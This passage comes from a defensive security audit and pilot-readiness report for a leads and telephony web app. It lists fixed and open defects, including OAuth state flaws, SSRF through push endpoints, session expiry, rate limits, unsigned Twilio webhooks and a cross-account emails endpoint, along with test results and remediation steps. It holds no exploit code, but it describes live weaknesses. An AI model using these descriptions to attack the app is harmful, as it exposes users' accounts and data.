- ~~**Medium — Session expiry is a text comparison** (ISO vs `CURRENT_TIMESTAMP`): expired sessions stay valid until the end of that UTC day.~~ **✅ Resolved 2026‑10‑07 (DEF‑10).** Expired rows are still never purged (open).
- ~~**Medium — Web‑push endpoint not validated** (`/api/push/subscribe`): an authenticated user can make the server POST to an arbitrary host:port.~~ **✅ Resolved 2026‑10‑07 (DEF‑10).**
- ~~**Medium — Fresh‑database contacts migration fails** (`db.js` contacts migration: "no such column: user_id") — a brand‑new or restored‑from‑scratch database keeps the legacy `contacts` table.~~ **✅ Resolved 2026‑10‑07 (DEF‑10).**
- **Low — 5‑minute duplicate window compares ISO vs SQLite timestamps** and rarely matches.

### DEF‑10 — Backend hardening: Gmail OAuth, suspension & sessions, rate limits, push validation, fresh‑DB migration — **High/Medium — ✅ RESOLVED (verified 2026‑10‑07)**
- **1. Gmail OAuth (High).** *Root cause:* one module‑level `pendingState` slot shared by every user (any callback carrying it was accepted for whoever started last), plus one module‑level OAuth2 client whose credentials were set per request (concurrent callbacks could cross tokens). → New `gmail_oauth_states` table (`ON DELETE CASCADE`, indexed): each Connect creates a random 32‑byte state and a separate 32‑byte browser nonce; only SHA‑256 hashes are stored; 10‑minute absolute expiry; consumed atomically and once (`UPDATE … SET used_at … WHERE used_at IS NULL AND julianday(expires_at) > julianday('now') RETURNING`). The nonce is an httpOnly, SameSite=Lax cookie scoped to `/auth/google`, so the consent link only completes in the browser that started it. `/auth/google` authenticates with the **session cookie only** (a `?token=`/Bearer start link could otherwise bind the flow to an attacker's account inside a victim's browser). The callback also rejects a signed‑in different account, a deleted or suspended initiator, and missing Gmail scopes; tokens are upserted by the initiating `user_id` only; a fresh OAuth client is created per request. Missing/malformed/expired/reused/mismatched state → generic `gmail_error=state_invalid` redirect. No code, token, state, nonce, client secret or Google error text is logged or echoed. Connect starts are limited to 10 per user per 10 min; a new start discards the user's earlier unused attempts. Disconnect revokes at Google unless another Plumbline account uses the same Google address.
  - *User‑visible limitation:* `GMAIL_OAUTH_ENABLED` is **on in production** (confirmed 2026‑10‑07 from the live callback response; not changed by this work). Browsers that send the backend session cookie on a top‑level navigation (desktop Chrome/Edge/Firefox with default settings) connect as before. Where that cookie is not sent (Safari/iOS under ITP, and likely the Android app), the old `?token=` link used to work and now shows "Sign in to Plumbline Leads in this browser first." Existing Gmail connections are unaffected. Restoring those clients needs a link‑completion design: the callback hands the browser a one‑time completion code and the signed‑in app (Bearer session) completes it, so the account is proven at completion rather than at start.
- **2. Suspension & sessions (Medium).** *Root cause:* `is_suspended` was never consulted by login or session lookup; `expires_at` (ISO, `T…Z`) was compared as text with `CURRENT_TIMESTAMP` (space‑separated), so sessions outlived their expiry for up to a day. → Shared `utils/session.js`: one lookup joining `users`, comparing `julianday(expires_at) > julianday('now')` (absolute UTC instants; time‑zone and DST independent; NULL/malformed fails closed). A suspended account is refused at login (403, after the password check so it reveals nothing without the password); any existing session is deleted and the cookie cleared on its **next request** (`requireAuth`, `/auth/me`) with 401 `ACCOUNT_SUSPENDED`; `/voice-client` refuses outbound calls from a suspended caller.
  - *Still open:* inbound calls/SMS to a suspended tester's number, push to their devices, and Gmail polling continue; expired session rows are not purged (a purge would modify production rows — recommended as a scheduled job).
- **3. Rate limits (High).** *Root cause:* none existed. → Dependency‑free in‑memory sliding‑window limiter (`utils/rateLimiter.js`, bounded to 20,000 keys per limiter with LRU eviction, 60 s sweeper). Responses are generic (`429` + `Retry-After`; login always "Invalid email or password" / "Too many sign‑in attempts"); emails are hashed in limiter keys and not logged.

  | Limit | Window | Max |
  |---|---|---|
  | Login attempts per IP (IPv6 per /64) | 15 min | 50 |
  | Login failures per IP | 15 min | 20 |
  | Login attempts / failures per IPv6 /48 | 15 min | 250 / 100 |
  | Login failures per email + IP | 15 min | 5 |
  | Login failures per email, all IPs (IPs that signed in to that account in the last 30 days are exempt) | 60 min | 20 |
  | Gmail connect starts per account | 10 min | 10 |
  | AI transcription (`/api/transcribe` + manual `POST /api/leads`) per account | 1 h / 24 h | 10 / 40 |
  | AI transcription, all accounts | 24 h | 200 |

  There is **no global login cap**, so one attacker cannot lock every user out; a successful login clears that account's failure counters. Manual transcripts over 20,000 characters are rejected (413) before any AI call. The transcription limiter runs before the upload is parsed.
  - *Client IP:* Render is fronted by Cloudflare; in production the key is `CF-Connecting-IP` (set by Cloudflare). `X-Forwarded-For` is never trusted. If the header is missing, per‑IP limits are **skipped** (never collapsed into one shared bucket) and per‑email limits still apply. `TRUST_CF_CONNECTING_IP=false|true` overrides. Whether the header reaches the app is visible (booleans only) in the owner‑only `GET /api/health/push-inventory` → `rateLimitIp`.
  - *Single Render instance (current):* counters live in process memory and are effectively global for the service.
  - *After a restart or deploy:* all counters, the known‑IP exemptions and the AI daily budgets reset to zero (an attacker gets a fresh window per deploy; an account owner's known‑IP exemption is re‑earned at their next successful sign‑in).
  - *Horizontal scaling:* each instance keeps its own counters, so effective limits multiply by the instance count (including the global AI ceiling). Before scaling out, move the counters to a shared store (e.g. a SQLite/Redis table) — no paid service was added here.
- **4. Push validation (Medium).** *Root cause:* `/api/push/subscribe` stored any endpoint and the server later POSTed to it (SSRF to arbitrary host:port); FCM tokens were unchecked. → `utils/pushValidation.js`: Web Push endpoints must be canonical `https` URLs (≤2048 chars, printable ASCII, no userinfo/port/fragment) on a browser push service (`fcm.googleapis.com`, `android.googleapis.com`, `jmt17.google.com`, `updates.push.services.mozilla.com`, `*.push.apple.com`, `*.notify.windows.com`); `p256dh` must be a valid uncompressed P‑256 point and `auth` 16 bytes; FCM tokens 32–4096 chars of `[A-Za-z0-9_:-]`. Rejections return a fixed body and log only a reason code — input is never echoed. Values are re‑validated at send time: invalid stored rows are skipped (not deleted) and logged as counts. Delete/logout accept legacy rows by type and length only so owners can still remove them. Ownerless rows stay excluded.
- **5. Fresh‑database contacts migration (Medium).** *Root cause:* a fresh DB created `contacts` in the original legacy shape (`phone TEXT PRIMARY KEY`, few columns); the per‑user migration then `INSERT … SELECT`ed columns that table never had (`user_id`, `name`, address fields) → "no such column: user_id", swallowed by `try/catch`, leaving the legacy table. → Fresh DBs create the final schema directly; both contacts rebuilds (per‑user and phone‑nullable) are column‑aware, preserve `id`/`company`/`contact_type`, run in a transaction with FK enforcement off (legacy rows pointing at deleted users no longer abort them), and clear a half‑built table from a failed run; owner stamping now runs after the contacts upgrade. The test‑only workaround in `test-account-isolation.js` was removed and replaced by an assertion.
- **Verification (2026‑10‑07):** new hermetic `backend/scripts/test-auth-hardening.js` — **100/100 pass** (temp DB, fake Google/OpenAI/web‑push/Firebase, no network): OAuth A1–A33, suspension/expiry B1–B12, rate limits C1–C25, push D1–D16, read‑only inventory F1–F4, migration E1–E9 (fresh DB, legacy DBs with and without `user_id`, FK orphan, intermediate schema, leftover table, owner stamping order — each in a child process). `test-account-isolation.js` **61/61**, `test-twilio-security.js` **34/34**, `test-emails-isolation.js` **11/11**; backend `node --check` clean; frontend production build exit 0; `git diff --check` clean. An adversarial review (including mutation testing) found 4 major and several minor gaps in the first draft — `?token=` start‑link attack, a global login cap usable to lock out everyone, targeted per‑email lockout, unbudgeted AI via `POST /api/leads`, an FK that blocked user deletion, unbounded OAuth rows, revokes that broke shared Google accounts, the phone‑nullable migration — all corrected and covered by tests above.

### DEF‑L (cluster) — Low
- Raw Twilio recording URLs (embedding the Account SID) returned to the browser in `GET /api/calls`.
- `numbers.js POST /claim` lets any authenticated tester spend the owner's Twilio balance buying a real number.
- Inbound call/SMS to an **unmapped** number silently routes into the owner account (misconfiguration → cross‑account exposure).
- Mic classifier ignores `err.cause.message`.
- **38 `t.<key>` references missing from both `en` and `es`** — all have inline English fallbacks, so Spanish shows English for those strings (no blank UI). List includes e.g. `appRetry`, `inboxCompose`, `leadReadMore`, `contactsSwipeDelete`, `leadListTotal` ("total"). (`t.clientX/clientY/category/stop` in the raw scan are false positives — a touch‑event object, not translations.)
- `transcribe` fileFilter bypassable; `express.json` 2 MB limit generous.
- No `busy_timeout` on SQLite (fine for the current single instance; blocks horizontal scaling).
- Latent: `leads.js` PATCH re‑fetch is unscoped but **not currently exploitable** (guarded by `changes===0 → 404`); add `AND user_id=?` for defense‑in‑depth.

**Refuted by verification:** "cold starts silently drop inbound webhooks" — contradicted by `render.yaml` Starter plan (no spin‑down) **provided the live service matches the Blueprint** (see DEF‑5).

---

## 7. Localization (detail)
- `en` and `es` are **symmetric** (483 keys each) — no language‑only asymmetry.
- All 6 `callsMic*` keys present in both languages.
- 38 genuinely‑missing keys (referenced but undefined in both languages) all render via inline English fallbacks → **no blank strings**, but Spanish is incomplete for those ~38 strings. Low severity, cosmetic.

---

## 8. Phase 8 — Security & operational summary
Confirmed items are itemized in §6 with file:line. Positives worth recording:
- **Account‑ownership scoping is correct and enforced** across leads, calls, messages, contacts, voicemail, recordings, numbers, settings, and counts — proven live (§5a). The **only** confirmed cross‑account gap is DEF‑1 (emails PATCH).
- **Owner authorization** is consistently enforced: every `admin.js` route uses `requireOwner`, and (since DEF‑8, 2026‑10‑05) so do `/api/migrate` and the `/api/health/env|owner` diagnostics — *correction:* the deployed `/api/migrate` previously required only a session; `register` cannot create owners; `tester-bypass` cannot elevate to owner.
- **Auth** uses bcrypt + random 32‑byte session tokens, 30‑day TTL, httpOnly cookies (Secure+SameSite=None in prod), with a Bearer/`?token=` fallback for Safari/media.
- The **Voice SDK token endpoint** derives identity server‑side from the session (`user_${req.userId}`) — the `index.js` comment calling it "public" is misleading but the route itself is auth'd.
- The **legacy `middleware/auth.js`** (X‑API‑Key with `SKIP_AUTH`/`!NODE_ENV` bypass) is **not** the mounted auth path; the global `requireAuth` (session) always enforces. Confirm no route re‑introduces the legacy middleware.

---

## 9. Phases 4/7 — Manual test procedures (require device / real Twilio)

For each: use two tester accounts with different assigned numbers, capture **build commit/time (Settings → Build Info), account email, device+OS, exact steps, expected vs actual, and a screenshot/recording**.

**Physical Android phone (📱):**
1. Cold start, background/resume, notification tap → correct screen, hardware back button, keyboard overlap, rotation.
2. Mic‑permission: deny mic on first call → one friendly card; tap **Open Settings** → **App Info page for `com.plumblineleads.app`** opens (not general Settings); enable mic, return → card clears on resume without auto‑placing a call; test "Don't ask again" then Open Settings.
3. Notification while foregrounded / backgrounded / tap‑to‑open.

**Real Twilio call/SMS (☎️):**
4. Inbound answered call → appears in Recents with caller+time; recording/duration/transcript/summary appear.
5. Inbound missed, no voicemail → marked missed; badge clears after viewing.
6. Inbound missed **with** voicemail → appears in Voicemail, links from Recents, has transcript/summary, plays with seek.
7. Outbound call → each post‑call outcome (answered/no‑answer/left‑voicemail) creates a **new** history row without altering older ones; **skipping** the note still keeps the row. Repeat calls to one number → separate rows.
8. Inbound/outbound SMS + MMS attachment → correct conversation, unread state, lead association, timeline entry.
9. **Cross‑account:** call & text **both** tester numbers from the same external phone → each account sees only its own events; duplicate detection, counts, names, statuses independent. (Server‑side scoping already proven in §5a; this validates the Twilio→account mapping end‑to‑end.)

**Blocked by missing credentials/config (🔑):** real OpenAI transcription/summary; real Twilio media playback; Gmail OAuth connect flow (`GMAIL_OAUTH_ENABLED` + Google creds); FCM/native push (`google-services.json` is **absent** while the gms plugin is applied — push cannot work in a built APK until added); web‑push VAPID keys.

---

## 10. Phase 9 — Paid‑pilot acceptance scorecard

| Criterion | Status |
|---|---|
| Login/logout work | ✅ Verified |
| Account data separation has no known failure | ❌ **DEF‑1 (emails PATCH)** |
| Calls work on Android phone | 📱 Manual — required |
| Voicemail record/transcribe/list/play | ☎️ Manual — required |
| Recents & Timeline reflect calls | ☎️ Manual — required |
| Mic denial recoverable & understandable | ✅ Verified (deep link 📱) |
| Production database persistent | ⚠️ **DEF‑5 — confirm dashboard** |
| Backup & recovery plan exists | ❌ **DEF‑4** |
| No tester can do owner ops | ✅ Verified |
| No known critical security vuln | ❌ **DEF‑1/2/3** |
| Documented support & rollback procedure | ❌ Not found |

Multiple **No‑Go** conditions are met (confirmed cross‑account exposure; credential‑exfil path; no recovery path). → **NO‑GO** until the blockers clear.

---

## 11. Change made during this pass
- **Updated `GOOGLE_TESTING_CHECKLIST.md`** to add coverage this pass found missing: the microphone‑permission denial/recovery flow, the pre‑pilot data‑safety gate (persistence + backup), the emails cross‑account check, and corrected the health path `/health → /api/health`. No other files were modified, committed, pushed, or reverted. All pre‑existing uncommitted work is preserved. (The `useVoiceDevice.js` initial‑state value was temporarily flipped to capture a mic‑card screenshot and **reverted**; `git diff` on that file is clean.)

---

## 12. Exact remaining actions for the owner (in order)
1. **Fix DEF‑1** (emails PATCH): guard `changes===0 → 404` before the re‑fetch, or scope the `SELECT` by `user_id`. (~1 line.)
2. **Confirm DEF‑5**: on the Render dashboard verify Starter+ plan, disk mounted at `/data`, `DB_PATH=/data/leads.db`; add a boot assertion logging the resolved DB path.
3. **Implement DEF‑4**: scheduled `db.backup()` off‑disk + a documented one‑command restore; remove the `/api/migrate` endpoint.
4. **Fix DEF‑2**: add Twilio `X‑Twilio‑Signature` validation to all `/api/twilio/*` webhooks and pin the recording host to `api.twilio.com` before attaching credentials.
5. ~~**Fix DEF‑3**~~ ✅ Done 2026‑10‑05. ~~Gmail OAuth state, login/transcription rate limits, suspension, session expiry, push validation, fresh‑DB migration~~ ✅ Done 2026‑10‑07 (DEF‑10). Decide whether to delete the ownerless push rows (count via `GET /api/health/push-inventory`), design Gmail link‑completion for Safari/Android before enabling Gmail, cap `/api/translate`, and stop inbound routing/push/Gmail sync for suspended accounts.
6. **Verify** `FRONTEND_URL` is set in production (CORS) and that `CF-Connecting-IP` reaches the app (`push-inventory` → `rateLimitIp`).
7. **Commit the untracked Android native project** (incl. `MainActivity.java` + `AppSettingsPlugin.java`) and the `versionCode` bump so a release is reproducible from git; add `google-services.json` if push is in scope.
8. Run the §9 manual matrix on a physical Android phone with two tester numbers and real Twilio.
9. Then re‑evaluate for **Paid Pilot Only**.
